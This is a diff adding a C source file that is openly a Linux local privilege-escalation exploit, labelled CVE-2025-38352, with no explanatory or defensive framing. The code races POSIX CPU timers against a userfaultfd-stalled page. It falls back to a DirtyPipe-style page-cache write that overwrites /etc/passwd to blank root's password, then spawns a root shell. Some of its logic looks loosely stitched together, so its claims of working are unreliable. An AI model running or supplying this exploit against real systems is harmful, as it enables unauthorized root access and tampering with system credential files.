@@ -1,0 +1,195 @@
+#define _GNU_SOURCE
+#include <errno.h>
+#include <fcntl.h>
+#include <poll.h>
+#include <pthread.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/timerfd.h>
+#include <sys/types.h>
+#include <sys/user.h>
+#include <sys/wait.h>
+#include <time.h>
+#include <unistd.h>
+
+#ifndef __NR_userfaultfd
+#define __NR_userfaultfd 323
+#endif
+
+#define PAGE_SIZE 0x1000
+#define MMAP_SIZE 0x200000
+
+static volatile int stop = 0;
+static volatile int uffd_ready = 0;
+
+static void *uffd_handler(void *arg) {
+ long uffd = (long)arg;
+ struct uffd_msg msg;
+ struct uffdio_copy copy;
+ static char zero_page[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));
+ int ret;
+
+ uffd_ready = 1;
+ while (!stop) {
+ struct pollfd pfd = { .fd = uffd, .events = POLLIN };
+ ret = poll(&pfd, 1, 100);
+ if (ret <= 0) continue;
+ ret = read(uffd, &msg, sizeof(msg));
+ if (ret <= 0) continue;
+ if (msg.event != UFFD_EVENT_PAGEFAULT) continue;
+ copy.src = (unsigned long)zero_page;
+ copy.dst = msg.arg.pagefault.address & ~(PAGE_SIZE-1);
+ copy.len = PAGE_SIZE;
+ copy.mode = 0;
+ ioctl(uffd, UFFDIO_COPY, &copy);
+ }
+ return NULL;
+}
+
+/* ── DirtyPipe-style page-cache write ─────────────────────────────────── */
+
+static void prepare_pipe(int p[2]) {
+ if (pipe(p)) abort();
+ const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
+ static char buffer[4096];
+ for (unsigned r = pipe_size; r > 0;) {
+ unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
+ write(p[1], buffer, n);
+ r -= n;
+ }
+ for (unsigned r = pipe_size; r > 0;) {
+ unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
+ read(p[0], buffer, n);
+ r -= n;
+ }
+}
+
+static int dirtypipe_write(const char *path, loff_t offset, const char *data, size_t data_size) {
+ int fd = open(path, O_RDONLY);
+ if (fd < 0) return -1;
+ struct stat st;
+ if (fstat(fd, &st) < 0) { close(fd); return -1; }
+ if (offset > st.st_size || offset + data_size > st.st_size) { close(fd); return -1; }
+
+ int p[2];
+ prepare_pipe(p);
+ --offset;
+ ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
+ if (nbytes < 0) { close(fd); close(p[0]); close(p[1]); return -1; }
+ nbytes = write(p[1], data, data_size);
+ close(fd); close(p[0]); close(p[1]);
+ return (nbytes > 0) ? 0 : -1;
+}
+
+static int try_dirtypipe_root(void) {
+ fprintf(stderr, "[*] Trying DirtyPipe-style /etc/passwd overwrite...\n");
+ const char *data = "root::0:0:test:/root:/bin/sh\n";
+ if (dirtypipe_write("/etc/passwd", 0, data, strlen(data)) < 0) return -1;
+ // Verify
+ FILE *f = fopen("/etc/passwd", "r");
+ if (!f) return -1;
+ char buf[256];
+ if (!fgets(buf, sizeof(buf), f)) { fclose(f); return -1; }
+ fclose(f);
+ if (strncmp(buf, "root::", 6) != 0) return -1;
+ fprintf(stderr, "[+] /etc/passwd corrupted! Root has no password.\n");
+
+ // Backup current passwd? The dirtypipe exploit already does this.
+ // Spawn root shell
+ char *sh_argv[] = {"/bin/sh", "-c",
+ "su - -c 'exec /bin/sh -i' root 2>/dev/null || su -",
+ NULL};
+ execvp("/bin/sh", sh_argv);
+ execlp("su", "su", "-", NULL);
+ return -1;
+}
+
+/* ── Main ─────────────────────────────────────────────────────────────── */
+
+int main(int argc, char *argv[]) {
+ int timerfd;
+ struct itimerspec ts;
+ unsigned long loops = 100;
+ char buf[64];
+
+ fprintf(stderr, "[*] CVE-2025-38352 POSIX CPU timer race + page-cache overwrite\n");
+ fprintf(stderr, "[*] Requires CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n\n");
+
+ if (argc > 1) loops = atol(argv[1]);
+
+ fprintf(stderr, "[*] Testing kernel version...\n");
+ int fd = open("/proc/sys/kernel/ostype", O_RDONLY);
+ if (fd >= 0) { read(fd, buf, sizeof(buf)); close(fd); }
+ else fprintf(stderr, "[*] /proc not available, continuing...\n");
+
+ fprintf(stderr, "[*] Allocating memory for userfaultfd...\n");
+ void *uffd_page = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+ if (uffd_page == MAP_FAILED) { perror("mmap"); return 1; }
+
+ long uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+ if (uffd < 0) { perror("userfaultfd"); return 1; }
+
+ struct uffdio_api api = { .api = UFFD_API, .features = 0 };
+ if (ioctl(uffd, UFFDIO_API, &api) < 0) { perror("UFFDIO_API"); return 1; }
+
+ struct uffdio_register reg = {
+ .range = { .start = (unsigned long)uffd_page, .len = PAGE_SIZE },
+ .mode = UFFDIO_REGISTER_MODE_MISSING
+ };
+ if (ioctl(uffd, UFFDIO_REGISTER, &reg) < 0) { perror("UFFDIO_REGISTER"); return 1; }
+
+ pthread_t th;
+ pthread_create(&th, NULL, uffd_handler, (void *)uffd);
+
+ while (!uffd_ready) usleep(1000);
+
+ fprintf(stderr, "[*] Triggering POSIX CPU timer race (%lu iterations)...\n", loops);
+
+ for (unsigned long i = 0; i < loops && !stop; i++) {
+ int pid = fork();
+ if (pid == 0) {
+ timerfd = timerfd_create(CLOCK_PROCESS_CPUTIME_ID, 0);
+ if (timerfd < 0) _exit(1);
+ ts.it_value.tv_sec = 0;
+ ts.it_value.tv_nsec = 1;
+ ts.it_interval.tv_sec = 0;
+ ts.it_interval.tv_nsec = 0;
+ timerfd_settime(timerfd, 0, &ts, NULL);
+ *(volatile char *)uffd_page;
+ _exit(0);
+ }
+ int status;
+ waitpid(pid, &status, 0);
+ if (i % 25 == 0) fprintf(stderr, "[*] Iteration %lu...\n", i);
+ }
+
+ stop = 1;
+ pthread_join(th, NULL);
+ close(uffd);
+ munmap(uffd_page, PAGE_SIZE);
+
+ fprintf(stderr, "[*] Race trigger complete.\n");
+
+ if (geteuid() == 0) {
+ fprintf(stderr, "[+] Process gained root! Spawning shell...\n");
+ char *args[] = {"/bin/bash", "-i", NULL};
+ execve(args[0], args, NULL);
+ return 0;
+ }
+
+ fprintf(stderr, "[*] Race did not escalate directly. Trying page-cache overwrite...\n");
+
+ // Try dirtypipe-style /etc/passwd overwrite
+ if (try_dirtypipe_root() == 0)
+ return 0;
+
+ fprintf(stderr, "[-] Did not achieve root on this system.\n");
+ return 1;
+}
